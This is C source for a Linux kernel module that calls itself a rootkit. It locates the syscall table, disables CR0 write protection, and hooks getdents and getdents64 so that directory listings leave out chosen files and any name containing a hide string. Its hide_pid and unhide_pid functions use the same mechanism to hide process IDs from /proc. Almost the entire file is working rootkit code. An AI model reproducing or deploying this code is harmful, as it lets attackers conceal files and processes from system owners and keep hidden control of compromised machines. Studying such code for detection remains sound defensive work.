#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/types.h>
#include <asm/paravirt.h> // write_cr0
#include <linux/slab.h>		// kmalloc()
#include <linux/syscalls.h> //__MAP, __SC_DECL

#include "hooks.h"
#include "config.h"

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));

struct list_head list_files = LIST_HEAD_INIT(list_files);

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

typedef unsigned long long ino64_t;
typedef unsigned long long off64_t;
struct linux_dirent64 {
	ino64_t         d_ino;
	off64_t         d_off;
	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
	char            padding; // I don't know why but without this d_name includes one extra byte
	                         // at the beggining that doesn't belong to the name
	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

unsigned long *syscall_table = NULL;

//HOOK DEFINING
//similar to the way kernel defines syscalls using SYSCALL_DEFINEx
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct
//similar to the way kernel defines __MAP in syscalls.h
#define args1 regs->di
#define args2 args1, regs->si
#define args3 args2, regs->dx
#define args4 args3, regs->r10
#define args5 args4, regs->r8
#define args6 args5, regs->r9
#define args(n) args##n
#define hook_define(n_args, ret_type, syscall_name, ...) \
	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
	asmlinkage ret_type (*sys_##syscall_name##_orig)(const struct pt_regs* regs); \
	asmlinkage ret_type sys_##syscall_name##_hook(const struct pt_regs* regs){    \
		ret_type ret = sys_##syscall_name##_orig(regs);                           \
		return sys_##syscall_name##_do_hook(args(n_args), ret);                   \
	}

#else //normal args
#define hook_define(n_args, ret_type, syscall_name, ...) \
	asmlinkage ret_type sys_##syscall_name##_do_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__), ret_type ret); \
	asmlinkage ret_type (*sys_##syscall_name##_orig)(__MAP(n_args, __SC_DECL, __VA_ARGS__));  \
	asmlinkage ret_type sys_##syscall_name##_hook(__MAP(n_args, __SC_DECL, __VA_ARGS__)){     \
		ret_type ret = sys_##syscall_name##_orig(__MAP(n_args, __SC_ARGS, __VA_ARGS__));      \
		return sys_##syscall_name##_do_hook(__MAP(n_args, __SC_ARGS, __VA_ARGS__), ret);      \
	}

#endif
hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
//ENDTESTING-------------------------------------------------------------------


/*
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
asmlinkage long (*sys_getdents_orig)(const struct pt_regs* regs);
asmlinkage long sys_getdents_hook(const struct pt_regs* regs){
	long leidos = sys_getdents_orig(regs);
	return sys_getdents_do_hook(regs->di, regs->si, regs->dx, leidos);
}
asmlinkage long (*sys_getdents64_orig)(const struct pt_regs* regs);
asmlinkage long sys_getdents64_hook(const struct pt_regs* regs){
	long leidos = sys_getdents64_orig(regs);
	return sys_getdents64_do_hook(regs->di, regs->si, regs->dx, leidos);
}

#else
asmlinkage long (*sys_getdents_orig)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	long leidos = sys_getdents_orig(fd, dirent, count);
	return sys_getdents_do_hook(fd, dirent, count, leidos);
}
asmlinkage long (*sys_getdents64_orig)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage long sys_getdents64_hook(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count) {
	long leidos = sys_getdents64_orig(fd, dirent, count);
	return sys_getdents64_do_hook(fd, dirent, count, leidos);
}
#endif
*/

asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
	int buff_offset, deleted_size;
	struct linux_dirent* currnt;
	struct list_files_node* node;
	bool del;
	//printk(KERN_INFO "ROOTKIT: sysgetdents init\n");

	buff_offset = 0;
	while (buff_offset < ret){
		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
		del = false;
		if (strstr(currnt->d_name, HIDE_STR) != NULL)
			del = true;

		list_for_each_entry(node, &list_files, list){
			if (strcmp(currnt->d_name, node->name) == 0){
				del = true;
				break;
			}
		}

		if (del){
			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
			// Copies the rest of the buffer to the position of the current entry
			deleted_size = currnt->d_reclen;
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
			ret -= deleted_size;
		} else
			buff_offset += currnt->d_reclen;

	}
	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
	return ret;
}

// COPY PASTE: YOU CAN DO IT BETTER B****
asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, long ret) {
	int buff_offset, deleted_size;
	struct linux_dirent64* currnt;
	struct list_files_node* node;
	bool del;

	buff_offset = 0;
	while (buff_offset < ret){
		currnt = (struct linux_dirent64*)((char*)dirent + buff_offset);
		del = false;
		if (strstr(currnt->d_name, HIDE_STR) != NULL)
			del = true;

		list_for_each_entry(node, &list_files, list){
			if (strcmp(currnt->d_name, node->name) == 0){
				del = true;
				break;
			}
		}

		if (del){
			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
			// Copies the rest of the buffer to the position of the current entry
			deleted_size = currnt->d_reclen;
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
			ret -= deleted_size;
		} else
			buff_offset += currnt->d_reclen;

	}
	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
	return ret;
}

//__init para que solo lo haga una vez y después pueda sacarlo de memoria
int __init hooks_init(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT: Starting hooks\n");

	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
	sys_getdents64_orig = (void*)syscall_table[__NR_getdents64];

	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
	return 0;
}


void __exit hooks_exit(void){
	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_orig;
	DISABLE_WRITE();

	// delete list
	struct list_files_node* node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_files, list){
		list_del(&node->list);
		kfree(node);
	}
}

// HIDE THOSE FKING FILES
int hide_file(const char* name){
	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
	if (node == NULL){
		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
		return -1;
	}

	node->name = kmalloc(strlen(name)+1, GFP_KERNEL);
	if (node->name == NULL){
		printk(KERN_INFO "ROOTKIT: ERROR allocating node name for hiding file %s\n", name);
		kfree(node);
		return -1;
	}

	strcpy(node->name, name);
	list_add(&node->list, &list_files);
	printk(KERN_INFO "ROOTKIT: Hidden file %s\n", name);
	return 0;
}

int unhide_file(const char* name){
	struct list_files_node *node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_files, list){
		if (strcmp(node->name, name) == 0){
			list_del(&node->list);
			kfree(node->name);
			kfree(node);
			printk(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
			return 0;
		}
	}
	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found file %s\n", name);
	return -1;
}

// HIDE THOSE FKING PIDS
int hide_pid(int pid){
	char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
	if (pid > PID_MAX_LIMIT){
		printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d larger than PID_MAX_LIMIT\n", pid);
		return -1;
	}
	snprintf(pid_s, sizeof(pid_s), "%d", pid);
	return hide_file(pid_s);
	/*
	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
	node->pid = pid;
	list_add(&node->list, &list_pids);
	printk("ROOTKIT: Pid %d hidden\n", pid);*/
}

int unhide_pid(int pid){
	char pid_s[8];
	snprintf(pid_s, sizeof(pid_s), "%d", pid);
	return unhide_file(pid_s);
	/*
	struct list_pids_node* node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_pids, list){
		if (node->pid == pid){
			list_del(&node->list);
			kfree(node);
			printk("ROOTKIT: Pid %d unhidden\n", pid);
			break;
		}
	}
	*/
}
